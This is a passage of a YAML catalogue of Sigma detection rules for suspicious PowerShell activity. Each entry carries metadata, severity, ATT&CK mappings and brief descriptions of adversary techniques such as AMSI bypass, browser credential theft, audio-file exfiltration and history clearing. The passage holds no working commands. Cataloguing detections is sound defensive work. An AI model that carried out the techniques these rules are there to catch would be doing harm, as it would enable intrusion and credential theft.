    The knowledge of domain-level permission groups can help adversaries determine
    which groups exist and which users belong to a particular group.

    Adversaries may use this information to determine which users have elevated permissions,
    such as domain administrators.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1069.001
  tags:
  - attack.discovery
  - attack.t1069.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1069.002/T1069.002.md
  false_positives:
  - Administrator script
  notes: ''
- detection_id: de41232e-12e8-49fa-86bc-c05c7e722df9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_susp_download.yml
  name: Suspicious PowerShell Download - PoshModule
  description: Detects suspicious PowerShell download command
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-8.0
  - https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-8.0
  false_positives:
  - PowerShell scripts that download content from the Internet
  notes: ''
- detection_id: aff815cc-e400-4bf0-a47a-5d8a2407d4e1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_susp_get_nettcpconnection.yml
  name: Use Get-NetTCPConnection - PowerShell Module
  description: Adversaries may attempt to get a listing of network connections to
    or from the compromised system they are currently accessing or from remote systems
    by querying for information over the network.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1049
  tags:
  - attack.discovery
  - attack.t1049
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1049/T1049.md#atomic-test-2---system-network-connections-discovery-with-powershell
  false_positives:
  - Unknown
  notes: ''
- detection_id: bbb80e91-5746-4fbe-8898-122e2cafdbf4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_susp_invocation_generic.yml
  name: Suspicious PowerShell Invocations - Generic - PowerShell Module
  description: Detects suspicious PowerShell invocation command parameters
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Very special / sneaky PowerShell scripts
  notes: ''
- detection_id: 8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_susp_invocation_specific.yml
  name: Suspicious PowerShell Invocations - Specific - PowerShell Module
  description: Detects suspicious PowerShell invocation command parameters
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - Internal Research
  - https://github.com/HackTricks-wiki/hacktricks/blob/e4c7b21b8f36c97c35b7c622732b38a189ce18f7/src/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: cef24b90-dddc-4ae1-a09a-8764872f69fc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_susp_local_group_reco.yml
  name: Suspicious Get Local Groups Information
  description: 'Detects the use of PowerShell modules and cmdlets to gather local
    group information.

    Adversaries may use local system permission groups to determine which groups exist
    and which users belong to a particular group such as the local administrators
    group.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1069.001
  tags:
  - attack.discovery
  - attack.t1069.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1069.001/T1069.001.md
  false_positives:
  - Administrator script
  notes: ''
- detection_id: e3818659-5016-4811-a73c-dde4679169d2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_susp_reset_computermachinepassword.yml
  name: Suspicious Computer Machine Password by PowerShell
  description: 'The Reset-ComputerMachinePassword cmdlet changes the computer account
    password that the computers use to authenticate to the domain controllers in the
    domain.

    You can use it to reset the password of the local computer.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.t1078
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/reset-computermachinepassword?view=powershell-5.1
  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/
  false_positives:
  - Administrator PowerShell scripts
  notes: ''
- detection_id: 6942bd25-5970-40ab-af49-944247103358
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_susp_smb_share_reco.yml
  name: Suspicious Get Information for SMB Share - PowerShell Module
  description: 'Adversaries may look for folders and drives shared on remote systems
    as a means of identifying sources of information to gather as a precursor for
    Collection and

    to identify potential systems of interest for Lateral Movement.

    Networks often contain shared network drives and folders that enable users to
    access file directories on various systems across a network.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1069.001
  tags:
  - attack.discovery
  - attack.t1069.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1069.002/T1069.002.md
  false_positives:
  - Administrator script
  notes: ''
- detection_id: daf7eb81-35fd-410d-9d7a-657837e602bb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_susp_zip_compress.yml
  name: Zip A Folder With PowerShell For Staging In Temp  - PowerShell Module
  description: 'Detects PowerShell scripts that make use of the "Compress-Archive"
    Cmdlet in order to compress folders and files where the output is stored in a
    potentially suspicious location that is used often by malware for exfiltration.

    An adversary might compress data (e.g., sensitive documents) that is collected
    prior to exfiltration in order to make it portable and minimize the amount of
    data sent over the network.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1074.001
  tags:
  - attack.collection
  - attack.t1074.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1074.001/T1074.001.md
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a
  false_positives:
  - Unknown
  notes: ''
- detection_id: fe5ce7eb-dad8-467c-84a9-31ec23bd644a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_module/posh_pm_syncappvpublishingserver_exe.yml
  name: SyncAppvPublishingServer Bypass Powershell Restriction - PS Module
  description: Detects SyncAppvPublishingServer process execution which usually utilized
    by adversaries to bypass PowerShell execution restrictions.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/
  false_positives:
  - App-V clients
  notes: ''
- detection_id: 91e69562-2426-42ce-a647-711b8152ced6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_aadinternals_cmdlets_execution.yml
  name: AADInternals PowerShell Cmdlets Execution - PsScript
  description: Detects ADDInternals Cmdlet execution. A tool for administering Azure
    AD and Office 365. Which can be abused by threat actors to attack Azure AD or
    Office 365.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 8
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  - multi_signal_correlation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  - Execution
  - Impact
  - Reconnaissance
  techniques: []
  tags:
  - attack.execution
  - attack.reconnaissance
  - attack.discovery
  - attack.credential-access
  - attack.impact
  time_window: ''
  references:
  - https://o365blog.com/aadinternals/
  - https://github.com/Gerenios/AADInternals
  false_positives:
  - Legitimate use of the library for administrative activity
  notes: ''
- detection_id: fc028194-969d-4122-8abe-0470d5b8f12f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_access_to_browser_login_data.yml
  name: Access to Browser Login Data
  description: 'Adversaries may acquire credentials from web browsers by reading files
    specific to the target browser.

    Web browsers commonly save credentials such as website usernames and passwords
    so that they do not need to be entered manually in the future.

    Web browsers typically store the credentials in an encrypted format within a credential
    store.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1555.003
  tags:
  - attack.credential-access
  - attack.t1555.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1555.003/T1555.003.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9e620995-f2d8-4630-8430-4afd89f77604
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_active_directory_module_dll_import.yml
  name: Potential Active Directory Enumeration Using AD Module - PsScript
  description: Detects usage of the "Import-Module" cmdlet to load the "Microsoft.ActiveDirectory.Management.dl"
    DLL. Which is often used by attackers to perform AD enumeration.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  - Impact
  - Reconnaissance
  techniques: []
  tags:
  - attack.reconnaissance
  - attack.discovery
  - attack.impact
  time_window: ''
  references:
  - https://github.com/samratashok/ADModule
  - https://twitter.com/cyb3rops/status/1617108657166061568?s=20
  - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-enumeration-with-ad-module-without-rsat-or-admin-privileges
  false_positives:
  - Legitimate use of the library for administrative activity
  notes: ''
- detection_id: 4368354e-1797-463c-bc39-a309effbe8d7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_add_dnsclient_rule.yml
  name: Powershell Add Name Resolution Policy Table Rule
  description: 'Detects powershell scripts that adds a Name Resolution Policy Table
    (NRPT) rule for the specified namespace.

    This will bypass the default DNS server and uses a specified server for answering
    the query.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1565
  tags:
  - attack.impact
  - attack.t1565
  time_window: ''
  references:
  - https://twitter.com/NathanMcNulty/status/1569497348841287681
  - https://learn.microsoft.com/en-us/powershell/module/dnsclient/add-dnsclientnrptrule?view=windowsserver2022-ps
  false_positives:
  - Unknown
  notes: ''
- detection_id: 155c7fd5-47b4-49b2-bbeb-eb4fab335429
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_add_windows_capability.yml
  name: Add Windows Capability Via PowerShell Script
  description: Detects usage of the "Add-WindowsCapability" cmdlet to add Windows
    capabilities. Notable capabilities could be "OpenSSH" and others.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse?tabs=powershell
  - https://www.virustotal.com/gui/file/af1c82237b6e5a3a7cdbad82cc498d298c67845d92971bada450023d1335e267/content
  false_positives:
  - Legitimate usage of the capabilities by administrators or users. Add additional
    filters accordingly.
  notes: ''
- detection_id: bf72941a-cba0-41ea-b18c-9aca3925690d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_adrecon_execution.yml
  name: PowerShell ADRecon Execution
  description: Detects execution of ADRecon.ps1 for AD reconnaissance which has been
    reported to be actively used by FIN7
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.discovery
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/sense-of-security/ADRecon/blob/11881a24e9c8b207f31b56846809ce1fb189bcc9/ADRecon.ps1
  - https://bi-zone.medium.com/from-pentest-to-apt-attack-cybercriminal-group-fin7-disguises-its-malware-as-an-ethical-hackers-c23c9a75e319
  false_positives:
  - Unknown
  notes: ''
- detection_id: e0d6c087-2d1c-47fd-8799-3904103c5a98
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_amsi_bypass_pattern_nov22.yml
  name: AMSI Bypass Pattern Assembly GetType
  description: Detects code fragments found in small and obfuscated AMSI bypass PowerShell
    scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  - attack.execution
  time_window: ''
  references:
  - https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
  - https://twitter.com/cyb3rops/status/1588574518057979905?s=20&t=A7hh93ONM7ni1Rj1jO5OaA
  false_positives:
  - Unknown
  notes: ''
- detection_id: fa2559c8-1197-471d-9cdd-05a0273d4522
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_amsi_null_bits_bypass.yml
  name: Potential AMSI Bypass Script Using NULL Bits
  description: Detects usage of special strings/null bits in order to potentially
    bypass AMSI functionalities
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/r00t-3xp10it/hacking-material-books/blob/43cb1e1932c16ff1f58b755bc9ab6b096046853f/obfuscation/simple_obfuscation.md#amsi-bypass-using-null-bits-satoshi
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3ceb2083-a27f-449a-be33-14ec1b7cc973
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_apt_silence_eda.yml
  name: Silence.EDA Detection
  description: Detects Silence EmpireDNSAgent as described in the Group-IP report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: critical
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  - Impact
  techniques:
  - T1059.001
  - T1071.004
  - T1529
  - T1572
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.command-and-control
  - attack.t1071.004
  - attack.t1572
  - attack.impact
  - attack.t1529
  - attack.g0091
  - attack.s0363
  time_window: ''
  references:
  - https://www.group-ib.com/resources/threat-research/silence_2.0.going_global.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 96c982fe-3d08-4df4-bed2-eb14e02f21c8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_as_rep_roasting.yml
  name: Get-ADUser Enumeration Using UserAccountControl Flags
  description: Detects AS-REP roasting is an attack that is often-overlooked. It is
    not very common as you have to explicitly set accounts that do not require pre-authentication.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  tags:
  - attack.discovery
  - attack.t1033
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1069.002/T1069.002.md#atomic-test-11---get-aduser-enumeration-using-useraccountcontrol-flags-as-rep-roasting
  - https://shellgeek.com/useraccountcontrol-flags-to-manipulate-properties/
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: e4f93c99-396f-47c8-bb0f-201b1fa69034
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_audio_exfiltration.yml
  name: Potential Data Exfiltration Via Audio File
  description: Detects potential exfiltration attempt via audio file using PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Exfiltration
  techniques: []
  tags:
  - attack.exfiltration
  time_window: ''
  references:
  - https://github.com/gtworek/PSBits/blob/e97cbbb173b31cbc4d37244d3412de0a114dacfb/NoDLP/bin2wav.ps1
  false_positives:
  - Unknown
  notes: ''
- detection_id: c1dda054-d638-4c16-afc8-53e007f3fbc5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_automated_collection.yml
  name: Automated Collection Command PowerShell
  description: Once established within a system or network, an adversary may use automated
    techniques for collecting internal data.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1119
  tags:
  - attack.collection
  - attack.t1119
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1119/T1119.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: d4a11f63-2390-411c-9adf-d791fd152830
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_capture_screenshots.yml
  name: Windows Screen Capture with CopyFromScreen
  description: 'Adversaries may attempt to take screen captures of the desktop to
    gather information over the course of an operation.

    Screen capturing functionality may be included as a feature of a remote access
    tool used in post-compromise operations

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1113
  tags:
  - attack.collection
  - attack.t1113
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1113/T1113.md#atomic-test-6---windows-screen-capture-copyfromscreen
  false_positives:
  - Unknown
  notes: ''
- detection_id: 26b692dc-1722-49b2-b496-a8258aa6371d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_clear_powershell_history.yml
  name: Clear PowerShell History - PowerShell
  description: Detects keywords that could indicate clearing PowerShell history
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1070.003
  tags:
  - attack.defense-evasion
  - attack.t1070.003
  time_window: ''
  references:
  - https://gist.github.com/hook-s3c/7363a856c3cdbadeb71085147f042c1a
  false_positives:
  - Legitimate PowerShell scripts
  notes: ''
- detection_id: bde47d4b-9987-405c-94c7-b080410e8ea7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_clearing_windows_console_history.yml
  name: Clearing Windows Console History
  description: Identifies when a user attempts to clear console history. An adversary
    may clear the command history of a compromised account to conceal the actions
    undertaken during an intrusion.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1070
  - T1070.003
  tags:
  - attack.defense-evasion
  - attack.t1070
  - attack.t1070.003
  time_window: ''
  references:
  - https://stefanos.cloud/blog/kb/how-to-clear-the-powershell-command-history/
  - https://www.shellhacks.com/clear-history-powershell/
  - https://community.sophos.com/sophos-labs/b/blog/posts/powershell-command-history-forensics
  false_positives:
  - Unknown
  notes: ''
- detection_id: 363eccc0-279a-4ccf-a3ab-24c2e63b11fb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_cmdlet_scheduled_task.yml
  name: Powershell Create Scheduled Task
  description: Adversaries may abuse the Windows Task Scheduler to perform task scheduling
    for initial or recurring execution of malicious code
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.005
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1053.005/T1053.005.md#atomic-test-4---powershell-cmdlet-scheduled-task
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1053.005/T1053.005.md#atomic-test-6---wmi-invoke-cimmethod-scheduled-task
  false_positives:
  - Unknown
  notes: ''
- detection_id: db885529-903f-4c5d-9864-28fe199e6370
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_computer_discovery_get_adcomputer.yml
  name: Computer Discovery And Export Via Get-ADComputer Cmdlet - PowerShell
  description: Detects usage of the Get-ADComputer cmdlet to collect computer information
    and output it to a file
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  tags:
  - attack.discovery
  - attack.t1033
  time_window: ''
  references:
  - http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html
  - https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/
  - https://www.cisa.gov/uscert/sites/default/files/publications/aa22-320a_joint_csa_iranian_government-sponsored_apt_actors_compromise_federal%20network_deploy_crypto%20miner_credential_harvester.pdf
  false_positives:
  - Legitimate admin scripts may use the same technique, it's better to exclude specific
    computers or users who execute these commands or scripts often
  notes: ''
- detection_id: 63bf8794-9917-45bc-88dd-e1b5abc0ecfd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_copy_item_system_directory.yml
  name: Powershell Install a DLL in System Directory
  description: Uses PowerShell to install/copy a file into a system directory such
    as "System32" or "SysWOW64"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1556.002
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.credential-access
  - attack.t1556.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1556.002/T1556.002.md#atomic-test-1---install-and-register-password-filter-dll
  false_positives:
  - Unknown
  notes: ''
- detection_id: 23590215-4702-4a70-8805-8dc9e58314a2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_cor_profiler.yml
  name: Registry-Free Process Scope COR_PROFILER
  description: 'Adversaries may leverage the COR_PROFILER environment variable to
    hijack the execution flow of programs that load the .NET CLR.

    The COR_PROFILER is a .NET Framework feature which allows developers to specify
    an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process
    that loads the Common Language Runtime (CLR).

    These profiliers are designed to monitor, troubleshoot, and debug managed code
    executed by the .NET CLR.

    (Citation: Microsoft Profiling Mar 2017)

    (Citation: Microsoft COR_PROFILER Feb 2013)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.012
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.persistence
  - attack.t1574.012
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1574.012/T1574.012.md#atomic-test-3---registry-free-process-scope-cor_profiler
  false_positives:
  - Legitimate administrative script
  notes: ''
- detection_id: 243de76f-4725-4f2e-8225-a8a69b15ad61
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_create_local_user.yml
  name: PowerShell Create Local User
  description: Detects creation of a local user via PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.001
  - T1136.001
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.persistence
  - attack.t1136.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1136.001/T1136.001.md
  false_positives:
  - Legitimate user creation
  notes: ''
- detection_id: afd12fed-b0ec-45c9-a13d-aa86625dac81
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_create_volume_shadow_copy.yml
  name: Create Volume Shadow Copy with Powershell
  description: Adversaries may attempt to access or create a copy of the Active Directory
    domain database in order to steal credential information
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003.003
  - attack.ds0005
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1&viewFallbackFrom=powershell-7
  false_positives:
